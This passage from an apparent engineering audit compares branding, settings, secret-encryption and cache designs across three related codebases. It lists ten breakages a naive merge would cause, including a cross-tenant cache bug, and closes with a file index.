   layer exists *only* for `BRAND_*`, sits *below* the DB, and is invisible to
   the spec system.
3. **Secret handling.** ERP encrypts at rest via ORM listeners with Fernet and
   `bao://` OpenBao references; the starter and Sub store plaintext and only
   mask on read. Any table merge either loses ERP's encryption or silently
   leaves starter/Sub rows unencrypted in a column the loader expects to
   decrypt.

## 6.9 Cache semantics differ enough to change behaviour

- starter: **no cache** in the resolver; a settings change is live on the next
  request.
- ERP: resolver **uncached and org-aware**, but a parallel `settings_cache`
  service is **org-blind** (`settings_cache.py:337-345` has no
  `organization_id` filter) — two read paths that can disagree, and the
  org-blind one can serve another tenant's value.
- Sub: resolver **cached in Redis, 30 s flat TTL**, degrading silently to
  uncached when Redis is down.

Adopting Sub's in-resolver Redis cache into a tenant-scoped kernel means the
cache key must include the tenant, or the starter inherits ERP's cross-tenant
bug at the kernel level. The starter's resolver docstring already earmarks this
port for phase 3 (settings_resolver.py:13-15) without mentioning the key shape.

## 6.10 Naive-merge breakage summary

1. Sharing `brand.json` across repos silently re-themes Sub, partially re-themes
   ERP, and does nothing visible in the starter (§6.2).
2. Adopting Sub's defaults leaks DotMac identity — including `from_email` and
   the mobile payment scheme — into every unbranded fork (§6.4).
3. Adopting the starter's CSP breaks every ERP page (jsdelivr + per-org Google
   Fonts) (§6.6).
4. Mapping ERP `custom_css` onto the kernel's sanitized field blanks existing org
   branding; keeping ERP's injection point destroys the starter's CSP guarantees
   (§6.5).
5. Merging `domain_settings` requires adding a tenant column + partial unique
   indexes + RLS to Sub's table, reconciling ERP's `scope` enum, and re-homing
   Sub's direct-SQL company-info writer (§6.8, §4.3).
6. Any `BrandProfile` consolidation must first retire Sub's dual (really triple)
   writer or inherit a dangling legacy writer (§6.7).
7. Changing `brand.json` resolution from `parents[2]` to `cwd()` (or vice versa)
   fails **open**, not loud: both loaders log INFO and fall back to built-in
   defaults on `FileNotFoundError` (§6.3).
8. Porting Sub's Redis settings cache into a tenant-scoped kernel without adding
   the tenant to the cache key reproduces ERP's cross-tenant cache bug at the
   kernel level (§6.9).
9. ERP has **no orphan-settings lint** and known orphans; adopting the starter's
   or Sub's lint at merge time will fail the build until every ERP spec gains a
   reader or the allowlist is reopened — which the starter's test contract
   forbids (`_ALLOWED_ORPHAN_SETTINGS` "may only ever shrink").
10. The starter's `SettingSpec.validator` callable has no counterpart in ERP/Sub;
    the ERP/Sub `env_var` field has no counterpart in the starter. A merged
    `SettingSpec` must carry both or drop one, and dropping `validator` loses the
    display-domain IANA-timezone and strftime gates.

---

# Appendix — key file index

## starter
- `packages/dotmac-kernel/src/dotmac_kernel/branding.py` — brand resolution + sanitizer
- `packages/dotmac-kernel/src/dotmac_kernel/settings_resolver.py` — spec registry + resolver
- `packages/dotmac-kernel/src/dotmac_kernel/settings_models.py` — `DomainSetting`
- `packages/dotmac-kernel/src/dotmac_kernel/settings_admin.py` — narrow admin re-exports
- `packages/dotmac-kernel/src/dotmac_kernel/templating.py` — Jinja globals + `render()`
- `packages/dotmac-kernel/src/dotmac_kernel/display.py` — display settings per-request memo
- `packages/dotmac-kernel/src/dotmac_kernel/middleware/security_headers.py` — `_STRICT_CSP`
- `packages/dotmac-kernel/src/dotmac_kernel/assembly.py` — `ProductAssemblySpec` (unconsumed `branding`)
- `packages/dotmac-kernel/src/dotmac_kernel/static/css/src/main.css` — build-time `@theme` palette
- `packages/dotmac-kernel/src/dotmac_kernel/templates/admin/settings/branding.html` — the only `| safe`
- `app/features/settings/{spec,seed,service,router,web}.py`
- `brand.json`, `.env.example:105-116`, `docs/SECURITY.md:46-74`, `docs/ARCHITECTURE.md:695-725`
- `tests/architecture/test_no_orphan_settings.py`, `tests/unit/test_security_baseline.py`

## ERP
- `app/config.py:33-373` — env brand + branding-upload knobs
- `app/web/deps.py:110-270` — `brand_context` / `org_brand_context` / `resolve_brand_context` / landing copy
- `app/models/finance/core_org/organization_branding.py` — branding table
- `app/models/finance/core_org/organization.py` — legal/contact/locale fields
- `app/services/finance/branding.py:32-648` — `CSSGenerator`, palette derivation, font presets
- `app/services/email_branding.py`, `app/services/email.py:252-304`
- `app/services/people/payroll/payslip_pdf.py`, `app/services/finance/rpt/pdf.py`
- `app/api/settings.py:625,716-789` — branding read / CSS / fonts-url / preview / palette
- `app/middleware/csp.py`, `app/main.py:364-393`
- `templates/partials/_org_branding_head.html`, `templates/partials/_brand_context.html`,
  `templates/partials/_document_header.html`, `templates/base.html:26-156`,
  `templates/login.html`, `templates/careers/base_careers.html`
- `app/services/settings_spec.py`, `app/services/domain_settings.py`,
  `app/services/settings_cache.py`, `app/services/settings_seed.py`,
  `app/services/settings_crypto.py`, `app/services/module_settings_web.py`,
  `app/services/feature_flag_service.py`
- `alembic/versions/20260130_add_payslip_branding_options.py` — orphaned document-footer columns

## Sub
- `app/services/branding_config.py` — static brand (`get_brand`)
- `app/services/brand_profiles.py` — `ResolvedBrand`, `resolve_brand`, upserts, legacy sync
- `app/models/branding.py:22-81` — `brand_profiles`
- `app/services/brand_theme.py` — colour scales, WCAG gate, palette role maps
- `app/web/public/branding.py` — `theme.css`, login hero, manifest, assets
- `app/web/brand_globals.py`, `app/web/customer/branding.py`, `app/web/reseller/branding.py`,
  `app/web/portal_branding.py`, `app/services/web_admin.py:160-222`
- `app/services/billing_invoice_pdf.py`, `app/services/email_template.py`, `app/services/email.py`
- `app/services/settings_spec.py`, `app/services/settings_specs/`,
  `app/services/domain_settings.py`, `app/services/settings_cache.py`,
  `app/services/settings_seed.py`, `app/services/control_registry.py`,
  `app/services/module_manager.py`, `app/services/smart_defaults.py`
- `app/services/web_system_company_info.py:18-83` — spec-bypassing writer
- `app/web/admin/system.py:3402-3739` — generic settings + branding write path
- `app/main.py:1361-1382`, `nginx/selfcare.dotmac.io.conf:50-56` — headers (no CSP)
- `brand.json`, `mobile/lib/src/config/env.dart`, `field_mobile/lib/app/theme.dart`
- `docs/CONTROL_RELATIONSHIPS_AND_BRANDING_SOT.md:36-84`
- `tests/architecture/test_no_orphan_settings.py`, `tests/test_brand_profiles.py`
